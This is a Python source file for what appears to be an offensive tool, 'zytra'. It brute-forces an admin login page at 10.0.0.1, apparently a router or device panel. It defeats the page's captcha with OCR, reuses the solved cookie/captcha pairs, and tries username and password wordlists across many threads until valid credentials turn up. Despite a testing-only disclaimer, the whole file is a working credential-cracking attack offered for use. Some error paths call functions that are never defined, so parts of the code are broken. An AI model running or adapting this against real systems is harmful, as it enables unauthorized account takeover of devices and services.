# Date: 03/16/2022
# Author: 7wp81x


"""
- Disclaimer -

This program is designed for testing purposes only.
Unauthorized use of this tool to gain unauthorized access to
systems or data is strictly prohibited and may be illegal.
The creator of this program (7wp81x) is not responsible
for any misuse or damage caused by its use.
Users are solely responsible for ensuring that they comply
with all applicable laws and regulations when using this tool.
By using or modifying this program,
you agree to use it responsibly and legally.

Any modifications made to the program (zytra) by users
are done at their own risk.
"""

from concurrent.futures import ThreadPoolExecutor
from http.cookies import SimpleCookie
from itertools import product
from PIL import Image
import pytesseract
import argparse
import requests
import random
import os,sys
import string
import time
import io
print_success = lambda msg: print(f"\033[0m[\033[1;32m+\033[0m] {msg}\033[0m")
print_success1 = lambda msg: print(f"\033[0m[\033[1;32m*\033[0m] {msg}\033[0m")
print_info = lambda msg: print(f"\033[0m[\033[1;34m*\033[0m] {msg}\033[0m")
print_error = lambda msg: print(f"\033[0m[\033[1;31m!\033[0m] {msg}\033[0m")

fetched_captcha = {}
found = False
captcha_count = 0
tries = 1

banner = """
 \033[1;92m @@@@@@@@ @@@ @@@ @@@@@@@ @@@@@@@   @@@@@@ 
       @@! @@! !@@   @@!   @@!  @@@ @@!  @@@
     @!!    !@!@!    @!!   @!@!!@!  @!@!@!@!
   !!:       !!:     !!:   !!: :!!  !!:  !!!
  :.::.: :   .:       :     :   : :  :   \033[1;31mv1.0\033[0m

 \033[0m[\033[1;32m+\033[0m] Github: \033[4;92mhttps://github.com/7wp81x\033[0m
 \033[0m[\033[1;32m+\033[0m] Author: \033[1;32m7wp81x\033[0m
"""

def captcha_solver():

	global count, captcha_count
	random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))

	req = requests.session()
	headers = {
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.9',
		'Connection': 'keep-alive',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': 'http://10.0.0.1',
		'Referer': 'http://10.0.0.1/admin/',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Zytra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
		'X-Requested-With': 'XMLHttpRequest',
	}

	target = req.get('http://10.0.0.1/admin/index?action=captcha.js')

	# Solve captcha protection (OCR)
	image = io.BytesIO(target.content)
	cookie = SimpleCookie(target.cookies.get_dict()).output(header='').strip()
	captcha = pytesseract.image_to_string(Image.open(image)) # image converted to text
	captcha = captcha.strip()
	params = {
		'execute': '1',
		'exec': 'login'
	}

	data = {
		'username': random_string,
		'password': random_string,
		'captcha': captcha
	}

	headers.update({'Cookie': cookie})
	# send a test login
	response = requests.post('http://10.0.0.1/admin/index', params=params, headers=headers, data=data, verify=False).text

	# check response if contains 'username/password' then the captcha is valid.
	if "username/password" in str(response):
		captcha_count += 1
		print_success1(f"Solved, Cookie: \033[1;32m{cookie[:15]}\033[0m... \033[1;33m=> \033[1;32m{captcha}\033[0m")
		# store the cookie and the captcha
		fetched_captcha.update({captcha_count:f"{cookie}|{captcha}"})
	else:
		# retry if failed.
		captcha_solver()


def login(username,password):
		global tries, found

		data = random.choice(list(fetched_captcha.keys())) # randomly solved captcha. 
		try:
			selected = fetched_captcha.get(data).split("|")
			captcha = selected[-1].strip()
			cookies = selected[-0].strip()
			params = {
				'execute': '1',
				'exec': 'login',
			}
			headers = {
				'Accept': '*/*',
				'Accept-Language': 'en-US,en;q=0.9',
				'Connection': 'keep-alive',
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'Cookie': cookies,
				'Origin': 'http://10.0.0.1',
				'Referer': 'http://10.0.0.1/admin/',
				'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Zytra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
				'X-Requested-With': 'XMLHttpRequest',
			}

			req_data = {
				'username': username,
				'password': password,
				'captcha': captcha,
			}

			response = requests.post('http://10.0.0.1/admin/index', params=params, headers=headers, data=req_data, verify=False)
			if 'username/password' in response.text:
				if not found:
					print(f" \033[0m[\033[1;32m{tries}\033[0m] \033[1;33m{username}\033[0m:\033[1;33m{password} \033[1;32m=> \033[1;31mLogin Failed!\033[0m")
					tries += 1

			elif "CAPTCHA code" in str(response.text):
				fetched_captcha.pop(data)
				choose = random.choice(list(fetched_captcha.keys()))
				brute(username,password, fetched_captcha.get(choose))

			else:
				found = True
				print()
				print_success(f"Valid credentials found: \033[1;32m{username}\033[0m:\033[1;92m{password}\033[0m\n")
				sys.exit(1)

		except requests.exceptions.RequestException:
			Error("Exception occurred, Reconnecting...")
			brute(username,password,fetched_captcha.get(data))
		except KeyboardInterrupt:
			sys.exit(1)
		except:
			Error("Exception occurred, Reconnecting...")
			brute(username,password,fetched_captcha.get(data))


def captcha_bypass(num):
	with ThreadPoolExecutor(max_workers=10) as thread:
		for _ in range(0,num):
			thread.submit(captcha_solver)
	thread.shutdown(wait=True)

	if len(fetched_captcha) != 0:
		print_success(f"Solved captcha: \033[1;32m{len(fetched_captcha.keys())}")
	else:
		print_error(f"Failed to solve any captcha!")
		exit()

def process_inputs(username, password, username_file, password_file, threads, captcha_count):
	global found
	print(banner)
	if captcha_count <= 0:
		captcha_count = 10

	if threads <= 0:
		threads = 1

	if username_file and password_file and not password and not username:
		if not os.path.exists(username_file):
			print_error(f"Username list: '\033[1;31m{username_file}\033[0m' doesn't exists.")
			return

		if not os.path.exists(password_file):
			print_error(f"Password list: '\033[1;31m{password_file}\033[0m' doesn't exists.")
			return

		username_list = open(username_file,"r").readlines()
		password_list = open(password_file, "r").readlines()

		print_success1(f"Total Usernames: \033[1;32m{len(username_list)}\033[0m, Total Passwords: \033[1;32m{len(password_list)}\033[0m")
		print_success1(f"Threads: \033[1;32m{threads}\033[0m\n")
		print_info(f"Solving captcha, Please wait...")
		captcha_bypass(captcha_count)
		print()
		print_info("Cracking password...")
		print("-"*32)

		with ThreadPoolExecutor(max_workers=threads) as connections:
			for user, passwd in product(username_list, password_list):
				user = user.strip()
				passwd = passwd.strip()
				if not found:
					connections.submit(login, user, passwd)
		connections.shutdown(wait=True)

	elif username and password_file and not username_file and not password:
		if not os.path.exists(password_file):
			print_error(f"Password list: '\033[1;31m{password_file}\033[0m' doesn't exists.")
			return

		password_list = open(password_file, "r").readlines()

		print_success1(f"Username: \033[1;32m{username}\033[0m, Total Passwords: \033[1;32m{len(password_list)}\033[0m")
		print_success1(f"Threads: \033[1;32m{threads}\033[0m\n")
		print_info(f"Solving captcha, Please wait...")
		captcha_bypass(captcha_count)
		print()
		print_info("Cracking password...")
		print("-"*32)

		with ThreadPoolExecutor(max_workers=threads) as connections:
			for passwd in password_list:
				passwd = passwd.strip()
				if not found:
					connections.submit(login, username.strip(), passwd)

		connections.shutdown(wait=True)

	elif username_file and password and not username and not password_file:
		if not os.path.exists(username_file):
			print_error(f"Username list: '\033[1;31m{username_file}\033[0m' doesn't exists.")
			return

		username_list = open(username_file,"r").readlines()

		print_success1(f"Total Usernames: \033[1;32m{len(username_list)}\033[0m, Password: \033[1;32m{password}\033[0m")
		print_success1(f"Threads: \033[1;32m{threads}\033[0m\n")
		print_info(f"Solving captcha, Please wait...")
		captcha_bypass(captcha_count)
		print()
		print_info("Cracking password...")
		print("-"*32)

		with ThreadPoolExecutor(max_workers=threads) as connections:
			for user in username_list:
				user = user.strip()
				if not found:
					connections.submit(login, user, password.strip())
		connections.shutdown(wait=True)

	elif username and password and not password_file and not username_file:
		print_info(f"Solving captcha, Please wait...")
		captcha_solver()
		print_info(f"Checking {username}, {password}...")
		login(username, password)

	if not found:
		print()
		print_error("Password not found.")
		exit()


def main():
	parser = argparse.ArgumentParser(description="LPB admin login bruteforce captcha bypass.")
	parser.add_argument('-U', '--username-file', help='file containing list of usernames')
	parser.add_argument('-P', '--password-file', help='file containing list of passwords')
	parser.add_argument('-u', '--username', help='single username')
	parser.add_argument('-p', '--password', help='single password')
	parser.add_argument('-t', '--threads', type=int, default=10, help='number of threads (default: 10)')
	parser.add_argument('-c', '--captcha-count', type=int, default=10, help='max num of captcha to solve (default: 10)')
	args = parser.parse_args()



	if args.username_file:
		if args.username:
			parser.error("Please specify only username or username_list, not both.")
	if args.password_file:
		if args.password:
			parser.error("Please specify only password or password_list, not both.")

	if not (args.username or args.username_file):
		parser.error("Please specify a username or username_list file")
	if not (args.password or args.password_file):
		parser.error("Please specify a password or password_list file")

	process_inputs(args.username, args.password, args.username_file,
		args.password_file, args.threads, args.captcha_count)

if __name__ == '__main__':
	main()
